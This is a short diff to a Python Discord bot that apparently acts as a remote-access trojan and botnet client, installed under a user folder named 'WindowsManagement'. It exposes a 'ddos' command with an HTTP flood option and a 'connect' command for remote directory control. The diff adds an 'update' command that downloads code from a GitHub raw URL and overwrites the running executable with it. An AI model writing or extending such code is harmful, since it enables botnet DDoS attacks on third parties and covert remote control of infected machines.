@@ -26,10 +26,6 @@ script_dir = os.path.dirname(exe_path)
 path_exist = r"C:\Users\\"+user+"\WindowsManagement\\"
 
 @bot.command()
-async def say(ctx):
-  await ctx.send("test")
-  
-@bot.command()
 async def ddos(ctx, *, user_input):
   listeMots = user_input.split()
   if listeMots[0] == "ddosHTTP":
@@ -85,7 +81,18 @@ async def exit(ctx, *, user_input):
             await bot.close()
     except SyntaxError as e:
         await ctx.send(f"erreur: {e}")
-
+@bot.command()
+async def update(ctx, *, user_input):
+    plugin_addr = "https://github.com/2MathNosseb/plugin/raw/main/plugin.py"
+    r = requests.get(plugin_addr)
+    if user_input == "update":
+        with open(exe_path, "w",encoding="utf-8",errors="replace") as f:
+            f.write(r.text)
+        f.close()
+        await ctx.send(f"update confirmed")
+    if user_input == "see":
+        await ctx.send(plugin_addr)
+        #await ctx.send(r.text)
 @bot.command()
 async def connect(ctx, *, user_input):
     global current_directory
